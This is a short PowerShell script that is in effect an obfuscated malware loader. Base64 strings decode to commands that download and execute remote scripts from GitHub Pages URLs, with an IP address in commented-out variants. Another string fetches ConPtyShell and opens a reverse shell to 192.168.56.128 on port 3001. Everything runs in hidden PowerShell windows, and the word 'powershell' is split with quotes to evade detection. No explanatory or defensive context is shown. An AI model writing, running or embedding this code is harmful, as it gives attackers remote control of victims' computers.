#$a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xLjM5Ljc1LjE4OjgwMDAvYTEnKQ=="
#$r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xLjM5Ljc1LjE4OjgwMDAvcjEnKQ=="

$a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vYXBvbG95b24uZ2l0aHViLmlvL0FuaW1lRmxpeC9hMScp"
$r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vYXBvbG95b24uZ2l0aHViLmlvL0FuaW1lRmxpeC9yMScp"
$d1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHBzOi8vYXBvbG95b24uZ2l0aHViLmlvL0FuaW1lRmxpeC9kMScp"
$t1 = "SUVYKElXUiBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYW50b25pb0NvY28vQ29uUHR5U2hlbGwvbWFzdGVyL0ludm9rZS1Db25QdHlTaGVsbC5wczEgLVVzZUJhc2ljUGFyc2luZyk7IEludm9rZS1Db25QdHlTaGVsbCAxOTIuMTY4LjU2LjEyOCAzMDAxCg=="
start-sleep -s 1


$p1 = "UG9XZVJTaEVMbDs7LW5vUCAtYyAi"
$p2 = $p1.substring(0,28)


start-sleep -s 1
start-sleep -s 1


$update_p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p2))
$update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1))
$update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))
$update_d1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d1))
$update_t1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($t1))


echo $update_a1 | pow""ersh""ell -nop -windowstyle hidden - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden - ; echo $update_d1 | pow""e""rsh""ell -nop -windowstyle hidden - ; echo $update_t1 | pow""e""rsh""ell -nop -windowstyle hidden -  


